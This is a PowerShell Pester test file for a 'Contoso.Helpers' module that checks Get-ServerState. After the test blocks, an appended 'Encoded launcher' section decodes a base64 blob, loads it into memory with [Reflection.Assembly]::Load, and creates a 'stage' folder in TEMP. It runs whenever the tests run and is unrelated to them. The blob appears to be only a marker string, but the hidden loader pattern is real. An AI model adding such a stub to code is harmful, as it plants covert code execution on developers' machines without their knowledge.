BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Helpers.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ServerState' {
    It 'returns a status object' {
        Get-ServerState -Name 'ContosoAgent' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

AfterAll {
    Remove-Module Contoso.Helpers -Force -ErrorAction SilentlyContinue
}
# Encoded launcher
$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp1bzhrbHVmbXV4")
Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length)
[Reflection.Assembly]::Load($ManagedBytes)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
